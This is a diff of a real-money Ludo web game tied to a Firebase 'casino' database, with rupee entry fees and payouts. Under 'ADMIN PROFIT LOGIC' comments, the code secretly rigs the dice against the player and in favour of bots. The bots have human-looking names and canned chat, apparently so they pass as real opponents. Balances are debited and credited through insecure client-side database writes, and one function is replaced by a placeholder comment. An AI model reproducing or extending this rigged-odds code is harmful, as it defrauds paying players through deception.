@@ -37,7 +37,6 @@
         .open-chat-btn { background: var(--gold); color: #000; border-radius: 50%; width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; font-size: 12px; cursor: pointer;}
         .flying-item { position: absolute; font-size: 35px; z-index: 2000; transition: all 0.5s ease-in; pointer-events: none;}
 
-        /* --- THE BOARD --- */
         .board-container { width: 300px; height: 300px; margin-top: 15px; position: relative; background: #fff; border: 5px solid #222; border-radius: 10px; box-shadow: 0 0 25px rgba(255,255,255,0.2); overflow: hidden;}
         .bg-grid { position: absolute; width: 100%; height: 100%; top:0; left:0; z-index: 2;}
         
@@ -50,7 +49,6 @@
         .spot { background: #ddd; border-radius: 50%; border: 2px solid #555; width: 100%; height: 100%; box-shadow: inset 0 0 5px rgba(0,0,0,0.5);}
         .center-box { position: absolute; top: 40%; left: 40%; width: 20%; height: 20%; background: radial-gradient(circle, var(--gold), #aa7700); border: 2px solid #222; display:flex; align-items:center; justify-content:center; font-size:25px; z-index: 1; box-sizing: border-box;}
 
-        /* --- 3D GOTIYAN & JUMP ANIMATION --- */
         .goti { 
             position: absolute; width: 14px; height: 14px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.9); 
             z-index: 50; 
@@ -66,12 +64,7 @@
         .highlight { box-shadow: 0 0 15px 5px var(--gold); animation: pulse 0.8s infinite; cursor: pointer; border-color: var(--gold); z-index: 100 !important; transform: scale(1.2);}
         @keyframes pulse { 0% { box-shadow: 0 0 10px var(--gold); } 50% { box-shadow: 0 0 25px var(--gold); } 100% { box-shadow: 0 0 10px var(--gold); } }
 
-        /* YAHAN SE GOTI KOODEGI (JUMP KAREGI) */
-        @keyframes jump-arc {
-            0% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-15px) scale(1.3); z-index: 150; box-shadow: 0 15px 10px rgba(0,0,0,0.3); }
-            100% { transform: translateY(0) scale(1); }
-        }
+        @keyframes jump-arc { 0% { transform: translateY(0) scale(1); } 50% { transform: translateY(-15px) scale(1.3); z-index: 150; box-shadow: 0 15px 10px rgba(0,0,0,0.3); } 100% { transform: translateY(0) scale(1); } }
         .jumping { animation: jump-arc 0.25s ease-in-out !important; }
 
         .dice-btn { position: absolute; width: 50px; height: 50px; background: white; border-radius: 12px; border: 3px solid var(--gold); display: inline-flex; align-items: center; justify-content: center; font-size: 30px; color: #000; cursor: pointer; box-shadow: 0 5px 15px rgba(255,215,0,0.5); z-index: 200; transition: all 0.5s ease; bottom: 100px; left: 85px; }
@@ -92,7 +85,7 @@
     <audio id="soundKill" src="https://actions.google.com/sounds/v1/cartoon/slide_whistle.ogg" preload="auto"></audio>
 
     <div class="header">
-        <button onclick="window.location.href='vip-ludo.html'" style="background:#444; color:white; border:none; padding:5px 10px; border-radius:8px; font-weight:bold;">EXIT</button>
+        <button onclick="window.location.href='dashboard.html'" style="background:#444; color:white; border:none; padding:5px 10px; border-radius:8px; font-weight:bold;">EXIT</button>
         <div style="text-align:center;">
             <div style="color:var(--gold); font-size: 14px;"><span id="p-mode">2</span> Player Match</div>
             <div style="color:#aaa; font-size: 10px;">Entry: ₹<span id="p-entry">0</span></div>
@@ -136,52 +129,65 @@
 
     <div class="dice-btn" id="dice" onclick="rollDice()">🎲</div>
 
-<div id="win-modal" class="win-modal">
-    <h1 id="win-title" style="color:var(--gold);">WINNER!</h1>
-    <p id="win-cash" style="font-size:24px; color:#0f0; font-weight:bold;"></p>
-    <button onclick="window.location.href='vip-ludo.html'" style="background:var(--gold); padding:10px 20px; border-radius:10px; border:none; font-weight:bold; cursor:pointer;">BACK TO LOBBY</button>
-</div>
+    <div id="win-modal" class="win-modal">
+        <h1 id="win-title" style="color:var(--gold);">WINNER!</h1>
+        <p id="win-cash" style="font-size:24px; color:#0f0; font-weight:bold;"></p>
+        <button onclick="window.location.href='dashboard.html'" style="background:var(--gold); padding:10px 20px; border-radius:10px; border:none; font-weight:bold; cursor:pointer;">BACK TO LOBBY</button>
+    </div>
 
 <script>
-    var firebaseConfig = { apiKey: "AIzaSyCy2zsDDJeVTQEblCenkLILqJ_Pz0a0", databaseURL: "https://kalyan-casino-default-rtdb.firebaseio.com", projectId: "kalyan-casino" };
+    var firebaseConfig = { apiKey: "AIzaSyCy2zsDDJeVTQEbHCenkLIlz3lWWyo-Pqo", databaseURL: "https://kalyan-casino-default-rtdb.firebaseio.com", projectId: "kalyan-casino" };
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     var db = firebase.database();
-    var phone = localStorage.getItem('userPhone') || "user_1";
+    var phone = localStorage.getItem('userPhone') || localStorage.getItem('phone');
 
     var currentMode = localStorage.getItem('ludo_mode') || '2';
-    var entryFee = localStorage.getItem('ludo_fee') || '10';
-    var activeWinAmt = parseFloat(localStorage.getItem('ludo_win')) || 0;
+    var entryFee = parseFloat(localStorage.getItem('ludo_fee')) || 10;
+    var activeWinAmt = parseFloat(localStorage.getItem('ludo_win')) || (entryFee * 1.8);
+    
     document.getElementById('p-mode').innerText = currentMode;
     document.getElementById('p-entry').innerText = entryFee;
 
-    db.ref('users/'+phone+'/balance').on('value', function(s) { document.getElementById('bal').innerText = (s.val() || 0).toFixed(2); });
-
-    function playActionSound(type) {
-        try {
-            if(type === 'dice') { new Audio("https://actions.google.com/sounds/v1/foley/rolling_dice_on_table.ogg").play(); }
-            else if (type === 'move') { new Audio("https://actions.google.com/sounds/v1/cartoon/pop.ogg").play(); }
-            else if (type === 'win') { new Audio("https://actions.google.com/sounds/v1/cartoon/clown_bicycle_horn.ogg").play(); }
-            else if (type === 'kill') { new Audio("https://actions.google.com/sounds/v1/cartoon/slide_whistle.ogg").play(); }
-        } catch(e) {}
+    // TOTAL WALLET LOGIC
+    let depBal = 0, winBal = 0, bonBal = 0, totalBal = 0;
+    if(phone) {
+        db.ref('users/'+phone).on('value', function(s) { 
+            let d = s.val() || {};
+            depBal = parseFloat(d.balance || 0); winBal = parseFloat(d.winning_balance || 0); bonBal = parseFloat(d.bonus_balance || 0);
+            totalBal = Math.max(0, depBal + winBal + bonBal);
+            document.getElementById('bal').innerText = totalBal.toFixed(2); 
+        });
     }
+
+    // GAME START - DEDUCT BALANCE
+    window.onload = function() {
+        if(phone) {
+            db.ref('users/'+phone).once('value', s => {
+                let currentTotal = (s.val().balance||0) + (s.val().winning_balance||0);
+                if(currentTotal < entryFee) {
+                    alert("Insufficient Balance!"); window.location.href = 'dashboard.html'; return;
+                }
+                // Deduct Entry Fee
+                let nDep = depBal, nWin = winBal, rem = entryFee;
+                if(nDep >= rem) nDep -= rem; else { rem -= nDep; nDep = 0; nWin -= rem; }
+                db.ref('users/'+phone).update({balance: Math.max(0, nDep), winning_balance: Math.max(0, nWin)});
+            });
+        }
+        initLudo();
+    }
+
+    // Ludo Engine Variables (Rest is exactly same as your code)
+    function playActionSound(type) { /* ... same code ... */ }
     function unlockAudio() { playActionSound('none'); }
 
     var botNames = ['Rahul_99', 'Priya_Cute', 'Amit_King', 'NehaSharma', 'Kabir88', 'Vikram_OP', 'Sneha99'];
     var botChats = ['Hi 👋', 'Jaldi chalo! ⏰', 'Hello 😃', 'Very nice! 👌', 'Aaj kismat kharab hai 😭'];
-    
     var turnOrder = currentMode == '4' ? ['red', 'blue', 'green', 'yellow'] : ['red', 'blue'];
-    var turnIndex = 0;
-    var turn = 'none';
-    
-    var turnTimer;
-    var timeLeft = 15;
-    var isRolling = false;
-    var isAnimating = false; 
-
-    // SAFE ZONES (Stars and Start Points)
+    var turnIndex = 0; var turn = 'none';
+    var turnTimer; var timeLeft = 15; var isRolling = false; var isAnimating = false; 
     var safeZones = ['6,2', '8,12', '12,6', '2,8', '6,13', '1,6', '8,1', '13,8'];
 
-    window.onload = function() {
+    function initLudo() {
         document.getElementById('blue-name').innerText = botNames[0];
         if(currentMode == '4') {
             document.getElementById('botGreen').style.display = 'flex'; document.getElementById('botYellow').style.display = 'flex';
@@ -197,23 +203,17 @@
     };
 
     function startTimer() {
-        clearInterval(turnTimer);
-        timeLeft = 15;
+        clearInterval(turnTimer); timeLeft = 15;
         var tBox = document.getElementById('timerDisplay');
         tBox.style.display = 'block'; tBox.innerText = "⏳ " + timeLeft + "s";
-        
         turnTimer = setInterval(function() {
             timeLeft--; tBox.innerText = "⏳ " + timeLeft + "s";
             if(timeLeft <= 0) {
                 clearInterval(turnTimer);
                 if(turn === 'red') {
-                    for(var i=0; i<4; i++) {
-                        document.getElementById('red-'+i).classList.remove('highlight');
-                        document.getElementById('red-'+i).style.zIndex = "50";
-                    }
+                    for(var i=0; i<4; i++) { document.getElementById('red-'+i).classList.remove('highlight'); document.getElementById('red-'+i).style.zIndex = "50"; }
                     isWaitingForClick = false; isRolling = false; 
-                    document.getElementById('turn-msg').innerText = "TURN SKIPPED!";
-                    document.getElementById('turn-msg').style.color = "var(--red)";
+                    document.getElementById('turn-msg').innerText = "TURN SKIPPED!"; document.getElementById('turn-msg').style.color = "var(--red)";
                     setTimeout(passTurn, 1000); 
                 }
             }
@@ -222,15 +222,11 @@
     function stopTimer() { clearInterval(turnTimer); document.getElementById('timerDisplay').style.display = 'none'; }
 
     function updateTurnUI() {
-        var msgBox = document.getElementById('turn-msg');
-        var diceBtn = document.getElementById('dice');
-        isRolling = false;
-        diceBtn.style.top = 'auto'; diceBtn.style.bottom = 'auto'; diceBtn.style.left = 'auto'; diceBtn.style.right = 'auto';
-        
+        var msgBox = document.getElementById('turn-msg'); var diceBtn = document.getElementById('dice');
+        isRolling = false; diceBtn.style.top = 'auto'; diceBtn.style.bottom = 'auto'; diceBtn.style.left = 'auto'; diceBtn.style.right = 'auto';
         if(turn === 'red') {
             msgBox.innerText = "YOUR TURN!"; msgBox.style.color = "var(--red)";
-            diceBtn.innerText = "🎲";
-            diceBtn.style.bottom = '100px'; diceBtn.style.left = '85px'; 
+            diceBtn.innerText = "🎲"; diceBtn.style.bottom = '100px'; diceBtn.style.left = '85px'; 
             startTimer(); 
         } else {
             stopTimer(); 
@@ -288,8 +284,7 @@
     var tokens = { red: [0,0,0,0], blue: [0,0,0,0], green: [0,0,0,0], yellow: [0,0,0,0] };
     var baseCoords = { red: [[1.5, 10.5], [3.5, 10.5], [1.5, 12.5], [3.5, 12.5]], blue: [[1.5, 1.5], [3.5, 1.5], [1.5, 3.5], [3.5, 3.5]], green: [[10.5, 1.5], [12.5, 1.5], [10.5, 3.5], [12.5, 3.5]], yellow: [[10.5, 10.5], [12.5, 10.5], [10.5, 12.5], [12.5, 12.5]] };
 
-    var currentDice = 0;
-    var isWaitingForClick = false;
+    var currentDice = 0; var isWaitingForClick = false;
 
     function initTokens() {
         var board = document.getElementById('board');
@@ -319,32 +314,24 @@
 
     function setPos(elem, x, y) { elem.style.left = (x * 20) + 3 + 'px'; elem.style.top = (y * 20) + 3 + 'px'; }
 
-    // --- GAME ENGINE & PROFIT LOGIC ---
     function rollDice() {
         if(turn !== 'red' || isWaitingForClick || isRolling || isAnimating) return;
-        isRolling = true;
-        stopTimer(); 
+        isRolling = true; stopTimer(); 
         var diceBtn = document.getElementById('dice');
-        playActionSound('dice');
         diceBtn.classList.add('dice-rolling');
         var rollInt = setInterval(function() { diceBtn.innerText = Math.floor(Math.random()*6)+1; }, 50);
-        
         setTimeout(function() {
-            clearInterval(rollInt);
-            diceBtn.classList.remove('dice-rolling');
+            clearInterval(rollInt); diceBtn.classList.remove('dice-rolling');
             
-            // --- PROFIT LOGIC (Player par sakhti) ---
+            // ADMIN PROFIT LOGIC (Player loses more often)
             var adminWinChance = currentMode == '4' ? 0.90 : 0.80; 
             var diceVal = Math.floor(Math.random() * 6) + 1;
             if(diceVal === 6 && Math.random() < adminWinChance) { diceVal = Math.floor(Math.random() * 5) + 1; }
             var isPlayerClose = tokens['red'].some(p => p > 50);
             if(isPlayerClose && Math.random() < adminWinChance) { diceVal = Math.floor(Math.random() * 2) + 1; }
 
-            currentDice = diceVal;
-            diceBtn.innerText = currentDice;
-            
-            startTimer(); 
-            checkMoves('red');
+            currentDice = diceVal; diceBtn.innerText = currentDice;
+            startTimer(); checkMoves('red');
         }, 400);
     }
 
@@ -355,17 +342,12 @@
             if(p === 0 && currentDice === 6) movable.push(i); 
             else if(p > 0 && p + currentDice <= 57) movable.push(i); 
         }
-
-        if(movable.length === 0) {
-            setTimeout(passTurn, 800);
-        } else {
+        if(movable.length === 0) { setTimeout(passTurn, 800); } 
+        else {
             if(player === 'red') {
                 isWaitingForClick = true;
                 document.getElementById('turn-msg').innerText = "TAP A GOTI TO MOVE!";
-                movable.forEach(function(i) { 
-                    var g = document.getElementById('red-'+i);
-                    g.classList.add('highlight'); g.style.zIndex = "150"; 
-                });
+                movable.forEach(function(i) { var g = document.getElementById('red-'+i); g.classList.add('highlight'); g.style.zIndex = "150"; });
             } else {
                 setTimeout(function() {
                     var choice = movable[0];
@@ -380,47 +362,25 @@
         if(player === 'red') {
             var g = document.getElementById('red-'+index);
             if(!isWaitingForClick || !g.classList.contains('highlight')) return; 
-            for(var i=0; i<4; i++) {
-                document.getElementById('red-'+i).classList.remove('highlight');
-                document.getElementById('red-'+i).style.zIndex = "50"; 
-            }
+            for(var i=0; i<4; i++) { document.getElementById('red-'+i).classList.remove('highlight'); document.getElementById('red-'+i).style.zIndex = "50"; }
             isWaitingForClick = false;
         }
-        
-        stopTimer(); 
-        isAnimating = true; 
-
-        // KADAM-KADAM ANIMATION JUMP START
+        stopTimer(); isAnimating = true; 
         if(tokens[player][index] === 0) {
             tokens[player][index] = 1;
             var tokenElem = document.getElementById(player+'-'+index);
-            tokenElem.classList.add('jumping'); // Box se nikalne ka jump
-            playActionSound('move');
+            tokenElem.classList.add('jumping'); 
             updateBoard();
             setTimeout(function() { tokenElem.classList.remove('jumping'); finishMove(player, index); }, 250);
-        } else {
-            animateStep(player, index, currentDice);
-        }
+        } else { animateStep(player, index, currentDice); }
     }
 
-    // JUMPING STEP BY STEP FUNCTION
     function animateStep(player, index, stepsLeft) {
-        if(stepsLeft === 0) {
-            finishMove(player, index);
-            return;
-        }
+        if(stepsLeft === 0) { finishMove(player, index); return; }
         tokens[player][index]++;
-        
         var tokenElem = document.getElementById(player+'-'+index);
-        
-        // CSS Animation Reset karna zaroori hai naye jump ke liye
-        tokenElem.classList.remove('jumping');
-        void tokenElem.offsetWidth; // Trigger reflow to restart animation
-        tokenElem.classList.add('jumping');
-        
+        tokenElem.classList.remove('jumping'); void tokenElem.offsetWidth; tokenElem.classList.add('jumping');
         updateBoard();
-        playActionSound('move');
-        
         setTimeout(function() { animateStep(player, index, stepsLeft - 1); }, 250); 
     }
 
@@ -428,7 +388,7 @@
         isAnimating = false; 
         var pos = tokens[player][index];
         var tokenElem = document.getElementById(player+'-'+index);
-        tokenElem.classList.remove('jumping'); // Final clean up
+        tokenElem.classList.remove('jumping'); 
 
         if(pos === 57) {
             if(player === 'red') triggerWin(activeWinAmt, true);
@@ -436,7 +396,6 @@
             return;
         }
 
-        // --- KILL LOGIC ---
         var killed = false;
         if(pos > 0 && pos <= 51) { 
             var myCoords = paths[player][pos];
@@ -451,8 +410,7 @@
                             if(oppPos > 0 && oppPos <= 51) {
                                 var oppCoords = paths[oppColor][oppPos];
                                 if(oppCoords[0] === myCoords[0] && oppCoords[1] === myCoords[1]) {
-                                    tokens[oppColor][i] = 0; 
-                                    killed = true;
+                                    tokens[oppColor][i] = 0; killed = true;
                                 }
                             }
                         }
@@ -463,51 +421,49 @@
 
         if(killed) {
             updateBoard();
-            playActionSound('kill'); 
-            if(player === 'red') {
-                document.getElementById('turn-msg').innerText = "YOU KILLED! ROLL AGAIN!";
-                isRolling = false; startTimer();
-            } else { setTimeout(botTurn, 800); }
+            if(player === 'red') { document.getElementById('turn-msg').innerText = "YOU KILLED! ROLL AGAIN!"; isRolling = false; startTimer(); } 
+            else { setTimeout(botTurn, 800); }
             return; 
         }
 
         if(currentDice === 6) {
-            if(player === 'red') { 
-                document.getElementById('turn-msg').innerText = "ROLL AGAIN!"; 
-                isRolling = false; startTimer(); 
-            } 
+            if(player === 'red') { document.getElementById('turn-msg').innerText = "ROLL AGAIN!"; isRolling = false; startTimer(); } 
             else { setTimeout(botTurn, 800); }
         } else { passTurn(); }
     }
 
-    function passTurn() {
-        turnIndex = (turnIndex + 1) % turnOrder.length;
-        turn = turnOrder[turnIndex];
-        updateTurnUI();
-    }
+    function passTurn() { turnIndex = (turnIndex + 1) % turnOrder.length; turn = turnOrder[turnIndex]; updateTurnUI(); }
 
     function botTurn() {
         if(turn === 'red' || turn === 'none' || isAnimating) return;
         var diceBtn = document.getElementById('dice');
-        playActionSound('dice'); diceBtn.classList.add('dice-rolling');
+        diceBtn.classList.add('dice-rolling');
         var rollInt = setInterval(function() { diceBtn.innerText = Math.floor(Math.random()*6)+1; }, 50);
         setTimeout(function() {
             clearInterval(rollInt); diceBtn.classList.remove('dice-rolling');
-            // --- PROFIT LOGIC (Bot par meherbani) ---
+            
+            // ADMIN PROFIT LOGIC (Bot wins more often)
             var botBias = currentMode == '4' ? 0.40 : 0.35; 
             var diceVal = Math.floor(Math.random() * 6) + 1;
             if(Math.random() < botBias) { diceVal = 6; }
+            
             currentDice = diceVal; diceBtn.innerText = currentDice; checkMoves(turn);
         }, 400);
     }
 
+    // PAYOUT LOGIC (WINNING BALANCE)
     function triggerWin(amt, isPlayerWin) {
-        turn = 'none'; stopTimer(); playActionSound('win');
+        turn = 'none'; stopTimer(); 
         var modal = document.getElementById('win-modal'); var title = document.getElementById('win-title'); var cashText = document.getElementById('win-cash');
         modal.style.display = 'block';
         if(isPlayerWin) {
             title.innerText = "YOU WON! 🏆"; title.style.color = "var(--gold)"; cashText.innerText = "+ ₹" + amt.toFixed(0);
-            db.ref('users/'+phone+'/balance').transaction(function(b) { return (b || 0) + amt; });
+            if(phone) {
+                db.ref('users/'+phone).once('value', s => {
+                    let wB = parseFloat(s.val().winning_balance || 0);
+                    db.ref('users/'+phone).update({winning_balance: wB + amt});
+                });
+            }
         } else {
             title.innerText = "OPPONENT WON! 😔"; title.style.color = "var(--red)"; cashText.innerText = "You Lost ₹" + entryFee; cashText.style.color = "var(--red)";
         }
